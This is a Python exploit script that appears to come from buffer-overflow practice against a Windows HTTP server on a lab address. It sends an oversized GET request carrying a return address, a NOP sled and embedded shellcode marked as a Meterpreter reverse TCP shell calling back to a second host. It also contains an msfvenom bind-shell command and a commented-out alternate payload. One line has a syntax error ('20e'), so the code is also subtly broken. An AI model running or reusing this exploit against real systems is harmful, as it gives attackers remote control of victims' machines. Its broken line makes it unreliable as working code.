#!/usr/bin/python

# This Script connects to a specified IP and Port and just sends the data specified

# For payload without bad characters
# msfvenom -a x86 --platform windows -p "windows/shell_bind_tcp" LPORT=8081 -x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python

# When we move back in buffer our ESP is set to some location which is already been used by some other instruction.
# So, we have to change ESP to some location above our instruction which are not used by some other instruction.

import socket, sys
import time

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
while(True):
	try:
		sock.connect(("192.168.17.130",80))
	
	except socket.error:
		print("[DEBUG] Inside except")
		time.sleep(1.5)
		continue
	break

buf = "GET http://"
buf += "A"*1780
#buf += "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co"
buf += "\xed\x1e\x94\x7c"
buf += "\x90"*20e
buf += ("\xd9\xc0\xd9\x74\x24\xf4\xbf\xb3\x19\xfd\x1d\x5d\x2b\xc9\xb1"
"\x56\x83\xed\xfc\x31\x7d\x14\x03\x7d\xa7\xfb\x08\xe1\x2f\x79"
"\xf2\x1a\xaf\x1e\x7a\xff\x9e\x1e\x18\x8b\xb0\xae\x6a\xd9\x3c"
"\x44\x3e\xca\xb7\x28\x97\xfd\x70\x86\xc1\x30\x81\xbb\x32\x52"
"\x01\xc6\x66\xb4\x38\x09\x7b\xb5\x7d\x74\x76\xe7\xd6\xf2\x25"
"\x18\x53\x4e\xf6\x93\x2f\x5e\x7e\x47\xe7\x61\xaf\xd6\x7c\x38"
"\x6f\xd8\x51\x30\x26\xc2\xb6\x7d\xf0\x79\x0c\x09\x03\xa8\x5d"
"\xf2\xa8\x95\x52\x01\xb0\xd2\x54\xfa\xc7\x2a\xa7\x87\xdf\xe8"
"\xda\x53\x55\xeb\x7c\x17\xcd\xd7\x7d\xf4\x88\x9c\x71\xb1\xdf"					# windows/meterpreter/reverse_tcp Lport 4444 Lhost 192.168.17.131
"\xfb\x95\x44\x33\x70\xa1\xcd\xb2\x57\x20\x95\x90\x73\x69\x4d"
"\xb8\x22\xd7\x20\xc5\x35\xb8\x9d\x63\x3d\x54\xc9\x19\x1c\x30"
"\x3e\x10\x9f\xc0\x28\x23\xec\xf2\xf7\x9f\x7a\xbe\x70\x06\x7c"
"\xb7\x97\xb9\x52\x7f\xf7\x47\x53\x7f\xd1\x83\x07\x2f\x49\x25"
"\x28\xa4\x89\xca\xfd\x50\x80\x5c\x3e\x0c\x85\x1f\xd6\x4e\xa6"
"\x0e\x7b\xc7\x40\x60\xd3\x87\xdc\xc1\x83\x67\x8d\xa9\xc9\x68"
"\xf2\xca\xf1\xa3\x9b\x61\x1e\x1d\xf3\x1d\x87\x04\x8f\xbc\x48"
"\x93\xf5\xff\xc3\x11\x09\xb1\x23\x50\x19\xa6\x53\x9a\xe1\x37"
"\xf6\x9a\x8b\x33\x50\xcd\x23\x3e\x85\x39\xec\xc1\xe0\x3a\xeb"
"\x3e\x75\x0a\x87\x09\xe3\x32\xff\x75\xe3\xb2\xff\x23\x69\xb2"
"\x97\x93\xc9\xe1\x82\xdb\xc7\x96\x1e\x4e\xe8\xce\xf3\xd9\x80"
"\xec\x2a\x2d\x0f\x0f\x19\x2d\x48\xef\xdf\x1a\xf1\x87\x1f\x1b"
"\x01\x57\x4a\x9b\x51\x3f\x81\xb4\x5e\x8f\x6a\x1f\x37\x87\xe1"
"\xce\xf5\x36\xf5\xda\x58\xe6\xf6\xe9\x40\x19\x8c\x82\x77\xda"
"\x71\x8b\x13\xdb\x71\xb3\x25\xe0\xa7\x8a\x53\x27\x74\xa9\x6c"
"\x12\xd9\x98\xe6\x5c\x4d\xda\x22")
buf += "C"*50
buf += " HTTP/1.1\r\n\r\n"

# Bad Chars  \x00\x0d

# buf = "\x90" * 400

# buf += "\x81\xEC\x20\x03\x00\x00"		# to Reset ESP

# buf += ("\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
# "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
# "\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
# "\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
# "\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
# "\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
# "\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
# "\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
# "\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
# "\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
# "\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
# "\x29\x80\x6b\x00\xff\xd5\x6a\x08\x59\x50\xe2\xfd\x40\x50\x40"
# "\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x68\x02\x00\x1f\x91\x89"
# "\xe6\x6a\x10\x56\x57\x68\xc2\xdb\x37\x67\xff\xd5\x57\x68\xb7"
# "\xe9\x38\xff\xff\xd5\x57\x68\x74\xec\x3b\xe1\xff\xd5\x57\x97"
# "\x68\x75\x6e\x4d\x61\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57"
# "\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c"
# "\x01\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46"
# "\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0"
# "\x4e\x56\x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5"
# "\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb"
# "\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5")

# print("[DEBUG] Buffer len: ",len(buf))
# buf += "\x90"*(1012 - len(buf))
# buf += "\x58\xf2\x22\x00"



print("[+] Sent Data: "+buf)

sock.send(buf)

sock.close()